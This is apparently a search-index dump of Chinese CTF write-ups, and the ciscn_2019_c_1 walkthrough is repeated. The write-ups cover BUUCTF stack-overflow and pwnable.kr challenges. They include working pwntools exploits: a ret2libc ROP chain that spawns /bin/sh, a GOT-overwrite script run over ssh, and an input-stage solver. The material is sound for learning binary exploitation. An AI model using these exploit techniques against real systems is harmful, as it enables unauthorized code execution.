: pop r15 ; ret0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004007f0 : pop rbp ; ret0x0000000000400aec : pop rbx ; pop rbp ; ret0x0000000000400c83 : pop rdi ; ret0x0000000000400c81 : pop rsi ; pop r15 ; ret0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006b9 : ret0x00000000004008ca : ret 0x20170x0000000000400962 : ret 0x458b0x00000000004009c5 : ret 0xbf02 Unique gadgets found: 15 ┌──(kali㉿kali)-[~/Desktop]└─$ ROPgadget --binary ./ciscn_2019_c_1 --only \"ret\"Gadgets information============================================================0x00000000004006b9 : ret0x00000000004008ca : ret 0x20170x0000000000400962 : ret 0x458b0x00000000004009c5 : ret 0xbf02 Unique gadgets found: 4 Copy 找到pop rdi ; ret地址0x400c83，ret地址0x4006b9。 首先需要泄露出puts函数的地址，这样才能算出system函数和字符串/bin/sh的地址。为了节省时间，第一个字符用\\x00来绕过strlen以此来跳过循环加密。因为后面还需要调用system('/bin/sh')，因此还需要再执行一次main函数。 根据以上条件构造出第一个payload：payload1 = b'\\x00' + b'a' * 0x57 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr) 先用这部分看看输出情况，写出如下脚本： from pwn import * is_debug = 1file_name = './ciscn_2019_c_1'host = 'node3.buuoj.cn'port = 25980 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) elf = ELF(file_name) pop_rdi_ret = 0x400c83 ret = 0x4006b9 puts_plt = elf.plt['puts'] puts_got = elf.got['puts'] _start_addr = elf.symbols['_start'] payload1 = b'\\x00' + b'a' * 0x57 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr) sh.sendlineafter('Input your choice!\\n', '1') sh.sendlineafter('Input your Plaintext to be encrypted\\n', payload1) sh.interactive() if __name__ == '__main__': main() Copy 运行结果如下： ┌──(kali㉿kali)-[~/Desktop]└─$ python3 exp.py 1 ⨯[+] Starting local process './ciscn_2019_c_1': pid 3461[*] '/home/kali/Desktop/ciscn_2019_c_1' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)4196064[*] Switching to interactive modeCiphertext \\xf0\\x85j\\xe0\\x7fEEEEEEE hh iii EE mm mm mmmm aa aa cccc hh nn nnn eee EEEEE mmm mm mm aa aaa cc hhhhhh iii nnn nn ee e EE mmm mm mm aa aaa cc hh hh iii nn nn eeeee EEEEEEE mmm mm mm aaa aa ccccc hh hh iii nn nn eeeee ====================================================================Welcome to this Encryption machine ====================================================================1.Encrypt2.Decrypt3.ExitInput your choice!$ Copy 从上面可以看到puts函数的地址被泄露出来了，接下来就是用LibcSearcher来搜索puts的在libc中的地址，然后计算偏移量，再用system和/bin/sh在libc中的地址加上偏移量得到真实地址。然后再溢出调用system('/bin/sh')。 最终脚本如下： ps: 这边不知道为什么，我本地libc用2.31的EOF，然后我指定用2.27直接EOF，输入都不给输入。。但是buu的服务器上面上去让我选又得选那个2.27的才能正常通过……迷惑。 from pwn import *from LibcSearcher import * is_debug = 1file_name = './ciscn_2019_c_1'host = 'node3.buuoj.cn'port = 28565 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) elf = ELF(file_name) pop_rdi_ret = 0x400c83 ret = 0x4006b9 puts_plt = elf.plt['puts'] puts_got = elf.got['puts'] _start_addr = elf.symbols['_start'] payload1 = b'\\x00' + b'a' * 0x57 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr) sh.sendlineafter('Input your choice!\\n', '1') sh.sendlineafter('Input your Plaintext to be encrypted\\n', payload1) sh.recvuntil('Ciphertext\\n') sh.recvline() puts_addr = u64(sh.recvline()[:-1].ljust(8, b'\\x00')) libc = LibcSearcher('puts', puts_addr) libc_base = puts_addr - libc.dump('puts') sys_addr = libc_base + libc.dump('system') bin_sh_addr = libc_base + libc.dump('str_bin_sh') payload2 = b'\\x00' + b'a' * 0x57 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(sys_addr) sh.sendlineafter('Input your choice!\\n', '1') sh.sendlineafter('Input your Plaintext to be encrypted\\n', payload2) sh.interactive() if __name__ == '__main__': main() Copy "},{"title":"random","type":0,"sectionRef":"#","url":"Pwnable.kr/Toddlers_Bottle/random","content":"","keywords":""},{"title":"原题内容","type":1,"pageTitle":"random","url":"Pwnable.kr/Toddlers_Bottle/random#原题内容","content":"Daddy, teach me how to use random value in programming! ssh random@pwnable.kr -p2222 (pw:guest) Copy "},{"title":"程序源码","type":1,"pageTitle":"random","url":"Pwnable.kr/Toddlers_Bottle/random#程序源码","content":"#include <stdio.h> int main(){ unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(\"%d\", &key); if( (key ^ random) == 0xdeadbeef ){ printf(\"Good!\\n\"); system(\"/bin/cat flag\"); return 0; } printf(\"Wrong, maybe you should try 2^32 cases.\\n\"); return 0;} Copy "},{"title":"题目分析","type":1,"pageTitle":"random","url":"Pwnable.kr/Toddlers_Bottle/random#题目分析","content":"程序取出随机数random，然后和输入的key异或，若结果等于0xdeadbeef，那么就输出flag。 仔细观察，发现没有设置随机数种子，那么就是伪随机。 在自己的linux机子或者在pwnable.kr服务器上写一个random.c，代码如下： #include<stdio.h>int main(){ unsigned int random; random = rand(); prinf(\"%u\\n\", random ^ 0xdeadbeef);} Copy 编译后运行得到key的值为3039230856。 "},{"title":"ciscn_2019_en_2","type":0,"sectionRef":"#","url":"BUUCTF/栈溢出/ciscn_2019_en_2","content":"ciscn_2019_en_2 由于本题与ciscn_2019_c_1一模一样，因此一下内容也与ciscn_2019_c_1相同 checksec结果： RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILEPartial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 85) Symbols No 0 1 ciscn_2019_c_1 Copy 拖入ida64分析，main函数没有什么价值，就是判断输入内容，1就调用encrypt函数；2就让你自己解密，他不管；3就结束。 唯一可以看的就一个加密函数，代码如下： int encrypt(){ size_t v0; // rbx char s[48]; // [rsp+0h] [rbp-50h] BYREF __int16 v3; // [rsp+30h] [rbp-20h] memset(s, 0, sizeof(s)); v3 = 0; puts(\"Input your Plaintext to be encrypted\"); gets(s); while ( 1 ) { v0 = (unsigned int)x; if ( v0 >= strlen(s) ) break; if ( s[x] <= 96 || s[x] > 122 ) { if ( s[x] <= 64 || s[x] > 90 ) { if ( s[x] > 47 && s[x] <= 57 ) s[x] ^= 0xFu; } else { s[x] ^= 0xEu; } } else { s[x] ^= 0xDu; } ++x; } puts(\"Ciphertext\"); return puts(s);} Copy 刚进函数，就有一个gets入眼，那么搜索一下危险函数，然而并没有任何发现。那这题就只能自己构造ROP去调用system('/bin/sh')了，这里利用puts函数来计算地址。 首先用ROPgadget搜一下pop rdi ; ret和ret ┌──(kali㉿kali)-[~/Desktop]└─$ ROPgadget --binary ./ciscn_2019_c_1 --only \"pop|ret\"Gadgets information============================================================0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c80 : pop r14 ; pop r15 ; ret0x0000000000400c82 : pop r15 ; ret0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004007f0 : pop rbp ; ret0x0000000000400aec : pop rbx ; pop rbp ; ret0x0000000000400c83 : pop rdi ; ret0x0000000000400c81 : pop rsi ; pop r15 ; ret0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006b9 : ret0x00000000004008ca : ret 0x20170x0000000000400962 : ret 0x458b0x00000000004009c5 : ret 0xbf02 Unique gadgets found: 15 ┌──(kali㉿kali)-[~/Desktop]└─$ ROPgadget --binary ./ciscn_2019_c_1 --only \"ret\"Gadgets information============================================================0x00000000004006b9 : ret0x00000000004008ca : ret 0x20170x0000000000400962 : ret 0x458b0x00000000004009c5 : ret 0xbf02 Unique gadgets found: 4 Copy 找到pop rdi ; ret地址0x400c83，ret地址0x4006b9。 首先需要泄露出puts函数的地址，这样才能算出system函数和字符串/bin/sh的地址。为了节省时间，第一个字符用\\x00来绕过strlen以此来跳过循环加密。因为后面还需要调用system('/bin/sh')，因此还需要再执行一次main函数。 根据以上条件构造出第一个payload：payload1 = b'\\x00' + b'a' * 0x57 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr) 先用这部分看看输出情况，写出如下脚本： from pwn import * is_debug = 1file_name = './ciscn_2019_c_1'host = 'node3.buuoj.cn'port = 25980 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) elf = ELF(file_name) pop_rdi_ret = 0x400c83 ret = 0x4006b9 puts_plt = elf.plt['puts'] puts_got = elf.got['puts'] _start_addr = elf.symbols['_start'] payload1 = b'\\x00' + b'a' * 0x57 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr) sh.sendlineafter('Input your choice!\\n', '1') sh.sendlineafter('Input your Plaintext to be encrypted\\n', payload1) sh.interactive() if __name__ == '__main__': main() Copy 运行结果如下： ┌──(kali㉿kali)-[~/Desktop]└─$ python3 exp.py 1 ⨯[+] Starting local process './ciscn_2019_c_1': pid 3461[*] '/home/kali/Desktop/ciscn_2019_c_1' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)4196064[*] Switching to interactive modeCiphertext \\xf0\\x85j\\xe0\\x7fEEEEEEE hh iii EE mm mm mmmm aa aa cccc hh nn nnn eee EEEEE mmm mm mm aa aaa cc hhhhhh iii nnn nn ee e EE mmm mm mm aa aaa cc hh hh iii nn nn eeeee EEEEEEE mmm mm mm aaa aa ccccc hh hh iii nn nn eeeee ====================================================================Welcome to this Encryption machine ====================================================================1.Encrypt2.Decrypt3.ExitInput your choice!$ Copy 从上面可以看到puts函数的地址被泄露出来了，接下来就是用LibcSearcher来搜索puts的在libc中的地址，然后计算偏移量，再用system和/bin/sh在libc中的地址加上偏移量得到真实地址。然后再溢出调用system('/bin/sh')。 最终脚本如下： ps: 这边不知道为什么，我本地libc用2.31的EOF，然后我指定用2.27直接EOF，输入都不给输入。。但是buu的服务器上面上去让我选又得选那个2.27的才能正常通过……迷惑。 from pwn import *from LibcSearcher import * is_debug = 1file_name = './ciscn_2019_c_1'host = 'node3.buuoj.cn'port = 28565 def main(): if is_debug: sh = process(file_name) else: sh = remote(host, port) elf = ELF(file_name) pop_rdi_ret = 0x400c83 ret = 0x4006b9 puts_plt = elf.plt['puts'] puts_got = elf.got['puts'] _start_addr = elf.symbols['_start'] payload1 = b'\\x00' + b'a' * 0x57 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(_start_addr) sh.sendlineafter('Input your choice!\\n', '1') sh.sendlineafter('Input your Plaintext to be encrypted\\n', payload1) sh.recvuntil('Ciphertext\\n') sh.recvline() puts_addr = u64(sh.recvline()[:-1].ljust(8, b'\\x00')) libc = LibcSearcher('puts', puts_addr) libc_base = puts_addr - libc.dump('puts') sys_addr = libc_base + libc.dump('system') bin_sh_addr = libc_base + libc.dump('str_bin_sh') payload2 = b'\\x00' + b'a' * 0x57 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(sys_addr) sh.sendlineafter('Input your choice!\\n', '1') sh.sendlineafter('Input your Plaintext to be encrypted\\n', payload2) sh.interactive() if __name__ == '__main__': main() Copy","keywords":""},{"title":"passcode","type":0,"sectionRef":"#","url":"Pwnable.kr/Toddlers_Bottle/passcode","content":"","keywords":""},{"title":"原题内容","type":1,"pageTitle":"passcode","url":"Pwnable.kr/Toddlers_Bottle/passcode#原题内容","content":"Mommy told me to make a passcode based login system.My initial C code was compiled without any error!Well, there was some compiler warning, but who cares about that? ssh passcode@pwnable.kr -p2222 (pw:guest) Copy "},{"title":"程序源码","type":1,"pageTitle":"passcode","url":"Pwnable.kr/Toddlers_Bottle/passcode#程序源码","content":"#include <stdio.h>#include <stdlib.h> void login(){ int passcode1; int passcode2; printf(\"enter passcode1 : \"); scanf(\"%d\", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(\"enter passcode2 : \"); scanf(\"%d\", passcode2); printf(\"checking...\\n\"); if(passcode1==338150 && passcode2==13371337){ printf(\"Login OK!\\n\"); system(\"/bin/cat flag\"); } else{ printf(\"Login Failed!\\n\"); exit(0); }} void welcome(){ char name[100]; printf(\"enter you name : \"); scanf(\"%100s\", name); printf(\"Welcome %s!\\n\", name);} int main(){ printf(\"Toddler's Secure Login System 1.0 beta.\\n\"); welcome(); login(); // something after login... printf(\"Now I can safely trust you that you have credential :)\\n\"); return 0; } Copy "},{"title":"题目分析","type":1,"pageTitle":"passcode","url":"Pwnable.kr/Toddlers_Bottle/passcode#题目分析","content":"题目开始进入函数welcome，输入最长100个字符的name值，可以看到并不会造成栈溢出。 继续看到login函数，很容易发现两个scanf函数的passcode变量均没有添加取地址符号，那么在scanf时会将passcode所指向的内存地址改变。（这点可能不是很明了，在后续的分析中可能会更容易理解一点，先记住这一点） checksec结果如下： [*] '/home/passcode/passcode' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) Copy 到这边似乎并没有什么思路，但是可以发现RELRO的值是Partial RELRO，说明该程序的GOT表可写。 objdump -R查看GOT表结果如下： passcode: file format elf32-i386 DYNAMIC RELOCATION RECORDSOFFSET TYPE VALUE08049ff0 R_386_GLOB_DAT __gmon_start__0804a02c R_386_COPY stdin@@GLIBC_2.00804a000 R_386_JUMP_SLOT printf@GLIBC_2.00804a004 R_386_JUMP_SLOT fflush@GLIBC_2.00804a008 R_386_JUMP_SLOT __stack_chk_fail@GLIBC_2.40804a00c R_386_JUMP_SLOT puts@GLIBC_2.00804a010 R_386_JUMP_SLOT system@GLIBC_2.00804a014 R_386_JUMP_SLOT __gmon_start__0804a018 R_386_JUMP_SLOT exit@GLIBC_2.00804a01c R_386_JUMP_SLOT __libc_start_main@GLIBC_2.00804a020 R_386_JUMP_SLOT __isoc99_scanf@GLIBC_2.7 Copy 暂时先放着，可能后续会使用到。接下来查看passcode的反汇编代码，看看能否找到利用点。（由于代码太长，这里只展示关键部分） 08048564 <login>: 8048625: e8 f6 fd ff ff call 8048420 <printf@plt> 804857c: 8b 55 f0 mov -0x10(%ebp),%edx 804857f: 89 54 24 04 mov %edx,0x4(%esp) 8048583: 89 04 24 mov %eax,(%esp) 8048586: e8 15 ff ff ff call 80484a0 <__isoc99_scanf@plt> 80485e3: c7 04 24 af 87 04 08 movl $0x80487af,(%esp) 80485ea: e8 71 fe ff ff call 8048460 <system@plt> 08048609 <welcome>: 804862f: 8d 55 90 lea -0x70(%ebp),%edx 8048632: 89 54 24 04 mov %edx,0x4(%esp) 8048636: 89 04 24 mov %eax,(%esp) 8048639: e8 62 fe ff ff call 80484a0 <__isoc99_scanf@plt> 08048665 <main>: 804867a: e8 8a ff ff ff call 8048609 <welcome> 804867f: e8 e0 fe ff ff call 8048564 <login> Copy 首先从main开始，可以发现函数welcome和函数login是连续调用的，这说明这两个函数在执行的时候栈底（ebp）是相同的。然后来到welcome函数，可以发现name的起始位置是-0x70(%ebp)，而在login函数中，passcode1的起始位置是-0x10(%ebp)。这两个变量只相差了96个字节，而name可接受的字符串长度为100个字节，也就是说在输入name时最后4个字节可以覆盖掉passcode1的地址。 结合GOT表可写，我们现在的思路大致为： 输入100个字符的name字符串，使得它最后4个字符覆盖passcode1的地址，让passcode1指向GOT表中某个函数的地址；在scanf输入passcode1的时候将system地址写入，那么在调用对应被覆写函数时就会跳转到system函数调用。 这边选取printf函数来覆写。 "},{"title":"脚本源码","type":1,"pageTitle":"passcode","url":"Pwnable.kr/Toddlers_Bottle/passcode#脚本源码","content":"from pwn import * s = ssh(host='pwnable.kr', user='passcode', password='guest', port=2222)shellcode = b'a' * 0x60 + p32(0x0804a000)process = s.process(['./passcode'])process.sendline(shellcode)process.sendline(\"134514147\")process.recvuntil('passcode1 : ') flag = (process.recvline()).decode() print(\"Flag: {}\".format(flag)) Copy "},{"title":"input","type":0,"sectionRef":"#","url":"Pwnable.kr/Toddlers_Bottle/input","content":"","keywords":""},{"title":"原题内容","type":1,"pageTitle":"input","url":"Pwnable.kr/Toddlers_Bottle/input#原题内容","content":"Mom? how can I pass my input to a computer program? ssh input2@pwnable.kr -p2222 (pw:guest) Copy "},{"title":"程序源码","type":1,"pageTitle":"input","url":"Pwnable.kr/Toddlers_Bottle/input#程序源码","content":"#include <stdio.h>#include <stdlib.h>#include <string.h>#include <sys/socket.h>#include <arpa/inet.h> int main(int argc, char* argv[], char* envp[]){ printf(\"Welcome to pwnable.kr\\n\"); printf(\"Let's see if you know how to give input to program\\n\"); printf(\"Just give me correct inputs then you will get the flag :)\\n\"); // argv if(argc != 100) return 0; if(strcmp(argv['A'],\"\\x00\")) return 0; if(strcmp(argv['B'],\"\\x20\\x0a\\x0d\")) return 0; printf(\"Stage 1 clear!\\n\"); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x00\\xff\", 4)) return 0; read(2, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x02\\xff\", 4)) return 0; printf(\"Stage 2 clear!\\n\"); // env if(strcmp(\"\\xca\\xfe\\xba\\xbe\", getenv(\"\\xde\\xad\\xbe\\xef\"))) return 0; printf(\"Stage 3 clear!\\n\"); // file FILE* fp = fopen(\"\\x0a\", \"r\"); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, \"\\x00\\x00\\x00\\x00\", 4) ) return 0; fclose(fp); printf(\"Stage 4 clear!\\n\"); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1){ printf(\"socket error, tell admin\\n\"); return 0; } saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){ printf(\"bind error, use another port\\n\"); return 1; } listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c); if(cd < 0){ printf(\"accept error, tell admin\\n\"); return 0; } if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, \"\\xde\\xad\\xbe\\xef\", 4)) return 0; printf(\"Stage 5 clear!\\n\"); // here's your flag system(\"/bin/cat flag\"); return 0;} Copy "},{"title":"题目分析","type":1,"pageTitle":"input","url":"Pwnable.kr/Toddlers_Bottle/input#题目分析","content":"获取flag需要过5关，类似拆炸弹游戏，需要5步才能拆除炸弹。 "},{"title":"Stage 1","type":1,"pageTitle":"input","url":"Pwnable.kr/Toddlers_Bottle/input#stage-1","content":"第1步要求如下： 传入长度为100个字符。字符\"A\"所代表ascii值位置的字符为\\x00，字符\"B\"所代表位置的字符为\\x20\\x0a\\x0d 这步比较简单，直接构造就行，代码如下： argv = ['a' for i in range(100)] def stage1(): argv[ord('A')] = '\\x00' argv[ord('B')] = '\\x20\\x0a\\x0d' Copy "},{"title":"Stage 2","type":1,"pageTitle":"input","url":"Pwnable.kr/Toddlers_Bottle/input#stage-2","content":"第2步要求如下： stdin的内容为\\x00\\x0a\\x00\\xffstderr的内容为\\x00\\x0a\\x02\\xff 若直接在process中添加stdin = '\\x00\\x0a\\x00\\xff'和stderr = '\\x00\\x0a\\x02\\xff'会产生报错，因为这里需要使用管道（pipe）。 创建管道的方法为：r, w = os.pipe()。 然后在管道中写入我们的数据即可。代码如下： import os r_in, w_in = os.pipe()r_err, w_err = os.pipe() def stage2(): os.write(w_in, b'\\x00\\x0a\\x00\\xff') os.write(w_err, b'\\x00\\x0a\\x02\\xff') Copy "},{"title":"Stage 3","type":1,"pageTitle":"input","url":"Pwnable.kr/Toddlers_Bottle/input#stage-3","content":"第3步是获取环境变量\\xde\\xad\\xbe\\xef的值，如果它等于\\xca\\xfe\\xba\\xbe则通过。 环境变量是一个字典，因此可以构造一个字典传入。代码如下： env = {} def stage3(): env[b'\\xde\\xad\\xbe\\xef'] = b'\\xca\\xfe\\xba\\xbe' Copy "},{"title":"Stage 4","type":1,"pageTitle":"input","url":"Pwnable.kr/Toddlers_Bottle/input#stage-4","content":"第4步是从当前目录读入一个文件名是\\x0a的文件，读4个字符判断是否为\\x00\\x00\\x00\\x00，那么直接创建文件写入即可。代码如下： def stage4(): with open('\\x0a', 'wb') as f: f.write(b'\\x00\\x00\\x00\\x00') Copy "},{"title":"Stage 5","type":1,"pageTitle":"input","url":"Pwnable.kr/Toddlers_Bottle/input#stage-5","content":"第5步是监听本机的端口，端口号是argv中字符\"C\"的ascii码位置所在的文本。若收到字符串\\xde\\xad\\xbe\\xef则通过。代码如下： import socket, time def stage5(): s = socket.socket() s.connect(('127.0.0.1', 13145)) s.send(b'\\xde\\xad\\xbe\\xef') Copy "},{"title":"总结","type":1,"pageTitle":"input","url":"Pwnable.kr/Toddlers_Bottle/input#总结","content":"最终脚本源码： from pwn import *import os, socket, time argv = ['a' for i in range(100)]r_in, w_in = os.pipe()r_err, w_err = os.pipe()env = {} def stage1(): argv[ord('A')] = '\\x00' argv[ord('B')] = '\\x20\\x0a\\x0d' argv[ord('C')] = '13145' def stage2(): os.write(w_in, b'\\x00\\x0a\\x00\\xff') os.write(w_err, b'\\x00\\x0a\\x02\\xff') def stage3(): env[b'\\xde\\xad\\xbe\\xef'] = b'\\xca\\xfe\\xba\\xbe' def stage4(): with open('\\x0a', 'wb') as f: f.write(b'\\x00\\x00\\x00\\x00') def stage5(): s = socket.socket() s.connect(('127.0.0.1', 13145)) s.send(b'\\xde\\xad\\xbe\\xef') stage1()stage2()stage3()stage4() p = process(executable = './input', argv = argv, stdin = r_in, stderr = r_err, env = env) time.sleep(0.5)stage5() p.interactive() Copy 由于这个脚本需要传入argv、env、stdin、stderr并且还需要用socket发送消息，因此将脚本上传至服务器比较方便。 在pwnable.kr服务器中，/tmp目录权限为rwxrwx-wt，所以我们可以在/tmp下创建自己的目录，将脚本上传到该目录中。 由于input和flag文件都在/home/input2中，所以可以在自己创建的目录下做这两个文件的软链接来完成后续操作。 "}]